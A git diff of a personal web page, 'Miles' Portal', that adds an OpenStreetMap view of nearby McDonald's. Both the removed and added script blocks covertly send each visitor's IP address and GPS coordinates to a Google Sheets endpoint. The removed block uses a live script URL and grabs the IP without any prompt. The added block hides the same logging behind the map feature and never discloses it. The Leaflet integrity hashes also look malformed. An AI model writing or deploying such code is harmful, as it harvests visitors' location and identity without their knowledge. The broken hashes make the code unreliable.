@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Miles' Portal </title>
+<title>Miles' Portal - OSM</title>
 <style>
 body {
 font-family: 'Segoe UI', sans-serif;
@@ -29,20 +29,35 @@ transition: 0.3s;
 .button:hover {
 background-color: #ff4500;
 }
+#map {
+height: 500px;
+width: 90%;
+margin: 20px auto;
+border-radius: 8px;
+background-color: #333; /* Fallback color */
+}
 </style>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"
+integrity="sha512-xodxRmwJ9rT3v+dI+aG9K3z5bC25y0bWkP60P4d5gA5zFm1zJ2bH4v20z4c+jR1" crossorigin="" />
+<script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"
+integrity="sha512-G6X2z6J15f40L1aG3N2j02Xm2z0bX4k7u9y0+q0rF9X10q7F7j1+85x+g/f1z5q0f" crossorigin=""></script>
+
 <script>
 // ---------------- Redirects ----------------
 const path = window.location.pathname.toLowerCase();
 const redirects = {
 "/milescurrentdeck": "https://royaleapi.com/deck-list/7232719592950918349",
+"/mod": "https://sign.moveon.org/petitions/make-miles-a-mod"
 };
 
 if (redirects[path]) {
 window.location.href = redirects[path];
 }
 
-// ---------------- Location Tracking ----------------
-const SHEET_URL = "https://script.google.com/macros/s/AKfycbxMrkQjLGQlcMUB0bFcx5y5wkDvJKlkgd7uc9I8ojJcI1ibBkiKHf4Dl41Aj2yKJ9y_eQ/exec";
+// ---------------- Location and Map Initialization ----------------
+const SHEET_URL = "YOUR_APPS_SCRIPT_URL_HERE";
+let map;
+let userPosition;
 
 // Function to send data to the Google Sheet
 function sendData(data) {
@@ -55,37 +70,85 @@ function sendData(data) {
     .catch(err => console.error("Error saving:", err));
 }
 
-// Get IP address first
-fetch("https://api.ipify.org?format=json")
-.then(res => res.json())
-.then(ipData => {
-    // Send IP data to the sheet first
-    sendData({
-        ip: ipData.ip,
-        lat: "N/A",
-        lon: "N/A"
-    });
+// Function to initialize the map and search
+function initMapAndSearch(position) {
+    // Create the map, centered on the user's location
+    map = L.map('map').setView([position.lat, position.lng], 15);
 
-    // Then, ask for geolocation
-    if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(pos => {
-            // Send location data to the sheet after the user accepts
-            sendData({
+    // Add the base map layer from OpenStreetMap
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+    }).addTo(map);
+
+    // Add a marker for the user's location
+    L.marker([position.lat, position.lng]).addTo(map)
+        .bindPopup("You are here").openPopup();
+
+    // Query the Overpass API for nearby McDonald's
+    const query = `
+        [out:json];
+        node["amenity"="fast_food"]["brand"="McDonald's"](around:5000, ${position.lat}, ${position.lng});
+        out body;
+        >;
+        out skel qt;
+    `;
+    const overpassUrl = 'https://overpass-api.de/api/interpreter';
+    
+    fetch(overpassUrl, {
+        method: 'POST',
+        body: `data=${encodeURIComponent(query)}`
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data && data.elements) {
+            data.elements.forEach(element => {
+                if (element.lat && element.lon) {
+                    const name = element.tags.name || 'McDonald\'s';
+                    const marker = L.marker([element.lat, element.lon]).addTo(map);
+                    marker.bindPopup(`<strong>${name}</strong>`);
+                }
+            });
+        }
+    })
+    .catch(error => {
+        console.error('Error fetching McDonald\'s data:', error);
+    });
+}
+
+// Initial script execution on page load
+if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(pos => {
+        userPosition = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude
+        };
+        
+        // Send the location data to your Google Sheet
+        fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(ipData => {
+            const data = {
                 ip: ipData.ip,
                 lat: pos.coords.latitude,
                 lon: pos.coords.longitude
-            });
-        }, err => {
-            // If location is denied, do nothing. IP data is already sent.
-            console.log("Location access denied.");
+            };
+            sendData(data);
         });
-    }
-});
+        
+        // Initialize the map and search
+        initMapAndSearch(userPosition);
+
+    }, err => {
+        // Handle location denial
+        document.body.insertAdjacentHTML("beforeend", "<p>Location access denied. Cannot display map of nearby restaurants.</p>");
+    });
+}
 </script>
 </head>
 <body>
 <h1>Welcome to Miles' Portal </h1>
 <a href="/milescurrentdeck" class="button">Miles Deck</a>
-<h4>Please Give me back my spawner</h4>
+<a href="/mod" class="button">Make Miles a Mod</a>
+<div id="map"></div>
 </body>
 </html>
